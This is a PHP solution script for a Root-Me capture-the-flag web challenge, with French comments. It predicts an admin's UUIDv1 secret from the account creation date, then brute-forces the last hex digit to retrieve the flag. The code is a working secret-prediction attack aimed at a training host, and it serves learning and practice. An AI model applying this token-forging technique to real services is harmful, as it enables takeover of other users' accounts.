<?php
require_once "./functions.php";

$urls = [
    'signup' => 'http://challenge01.root-me.org:59091/api/signup',
    'login' => 'http://challenge01.root-me.org:59091/api/login'
];

$json_data = json_encode([
    'username' => 'a',
    'password' => 'a'
]);

foreach ($urls as $action => $url) {
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-type: application/json\r\n",
            'content' => $json_data
        )
    );

    $context = stream_context_create($options);
    $response_content = @file_get_contents($url, false, $context);
    $response_headers = $http_response_header;

    $response = json_decode($response_content);

    echo "Réponse de la requête $action : " . (!empty($response->message) ? $response->message : "l'utilisateur a déjà été créé") . "\n";

    if (!empty($response->secret)) {
        $uuid = $response->secret;
        echo "Secret utilisateur : " . $response->secret . "\n";
    }

    if ($action == 'login') {
        foreach ($response_headers as $header) {
            if (stripos($header, 'Set-Cookie') !== false && stripos($header, 'session') !== false) {
                preg_match('/session=([^;]+);/', $header, $matches);
                if (isset($matches[1])) {
                    $session_cookie = $matches[1];
                    echo "Cookie de session récupéré !\n";
                } else {
                    echo "Cookie de session non trouvé.\n";
                    #Le cookie session est crée lorsqu'on se connecte à un utilisateur (F12 -> Application)
                    $session_cookie = readline("Veuillez ajouter le cookie session : ");
                }
            }
        }
    }
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://challenge01.root-me.org:59091/api/user/1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIE, "session=$session_cookie");
$result = curl_exec($ch);
curl_close($ch);

$baseUrl = 'http://challenge01.root-me.org:59091/api/profile';

$dateAdmin = json_decode($result)->creation_date;
#la date a ajouter change (je ne sais pas pourquoi). C'est a adapté pour que ça fonctionne avec le profil "a" à 1 lettre près
$dateAdmin = Datetime::createFromFormat("Y-m-d H:i:s.u", $dateAdmin)->modify("+2 hours")->modify("-1 microseconds");

$uuidModified = modifyDateInUUIDv1($uuid, getTimestampByDate($dateAdmin));

for ($i = 0; $i < 16; $i++) {
    $parts = explode("-", $uuidModified);
    $parts[0] = substr($parts[0], 0, -1) . dechex($i);
    $secret = implode("-", $parts);
    $query = http_build_query(array('secret' => $secret));
    $url = "$baseUrl?$query";

    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);

    if (!str_contains($result, "Secret doesn't correspond to any user")) {
        echo "Secret admin : " . $secret . PHP_EOL;
        $find = true;
        break;
    }
    curl_close($ch);
}
if ($find) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $baseUrl . "?secret=" . $secret);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "session=$session_cookie");
    $result = curl_exec($ch);
    echo "Le flag : " . json_decode($result)->note;
    curl_close($ch);
} else {
    echo "y a eu un prob";
}
?>

